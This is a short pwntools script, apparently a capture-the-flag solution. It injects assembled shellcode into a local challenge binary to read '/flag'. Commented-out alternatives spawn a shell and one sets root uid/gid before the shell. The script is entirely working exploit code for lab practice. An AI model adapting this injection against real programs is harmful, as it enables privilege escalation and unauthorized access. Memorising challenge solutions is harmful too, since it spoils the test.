"""Shellcode injection: assemble and send shellcraft payload."""
from pwn import *
from pwn import asm, context, process
from pwnlib.shellcraft import shellcraft

context.update(arch="amd64", os="linux")

binary_path = "/challenge/binary-exploitation-basic-shellcode"

p = process(binary_path)

# sc = asm(shellcraft.sh())
# sc = asm(shellcraft.setreuid(0, 0) + shellcraft.sh())
sc = asm(shellcraft.cat("/flag"))

p.send(sc)

p.interactive()
